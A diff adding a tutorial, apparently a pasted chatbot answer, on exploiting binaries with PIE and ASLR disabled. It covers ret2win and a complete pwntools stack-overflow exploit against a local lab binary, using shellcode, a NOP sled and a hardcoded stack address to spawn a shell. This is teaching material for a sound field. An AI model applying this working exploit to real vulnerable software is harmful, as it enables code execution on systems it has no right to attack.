@@ -1,1 +1,67 @@
 
+In binary exploitation, ASLR (Address Space Layout Randomization) and PIE (Position Independent Executable) are the primary security mechanisms designed to randomize memory layouts.
+When you disable both (No-PIE and No-ASLR), the binary code, stack, heap, and libraries load at the exact same memory addresses every single time the program runs. This turns memory addresses from a moving target into fixed, predictable constants, making exploration much easier.
+Here are the two primary exploitation techniques used when PIE and ASLR are turned off.
+
+Technique 1: Standard Ret2Win (Simplest)
+
+This is the technique used in the previous example. Because No-PIE is active, the functions inside the main binary (like main, vulnerable_function, or a hidden win function) are mapped to static, hardcoded addresses in the 0x0804xxxx range (for 32-bit) or 0x40xxxx range (for 64-bit).
+• How it exploits No-PIE: You don't need to leak any information. You simply open the binary in a debugger once, copy the address of the function you want to call, and hardcode it directly into your Python script. It will work flawlessly on every execution.
+
+Technique 2: Shellcode Injection (Ret2Stack)
+
+Because No-ASLR is active, the location of the Stack itself is also entirely static. This allows you to inject raw assembly instructions (shellcode) directly into your buffer and redirect the return address to point right back at your own input on the stack.
+
+The Exploit Layout
+
+Instead of jumping to an existing function, your payload will look like this:
+[ Raw Shellcode ] + [ NOP Sled / Garbage Padding ] + [ Static Stack Address ]
+• NOP Sled (\x90): No-Operation instructions. If the CPU lands anywhere inside a NOP sled, it safely slides down to the shellcode without crashing. This handles minor buffer alignment shifts.
+
+The Python Exploit Code
+
+Here is how you execute a shellcode injection attack using pwntools against a static-stack environment:
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Set the target architecture (crucial for shellcode generation)
+context.update(arch='i386', os='linux')
+
+# 1. Start the target binary
+io = process('./vuln')
+
+# 2. Total offset needed to reach the Return Address
+total_offset = 76
+
+# 3. Generate standard Linux execve("/bin/sh") shellcode (approx 25 bytes)
+shellcode = asm(shellcraft.sh())
+
+# 4. Target Address: The exact static address of our stack buffer (Found via GDB)
+# Since ASLR is off, this address never changes between runs
+stack_buffer_address = p32(0xffffd040) 
+
+# 5. Build the payload
+# We place the shellcode at the beginning, pad the rest with NOPs (\x90), 
+# and overwrite the return address with the start of the stack buffer.
+payload = shellcode 
+payload += b"\x90" * (total_offset - len(shellcode))
+payload += stack_buffer_address
+
+# 6. Fire the payload
+io.sendline(payload)
+io.interactive()
+Use code with caution.
+
+How to Verify ASLR and PIE are Disabled
+
+You can use the built-in checksec command (included with pwntools) to inspect the compiled binary's security profile:
+bash
+$ checksec ./vuln
+[*] '/path/to/vuln'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled          <-- Required for Shellcode Injection to work
+    PIE:      No PIE (0x8048000)   <-- Confirms code addresses are static
+Use code with caution.
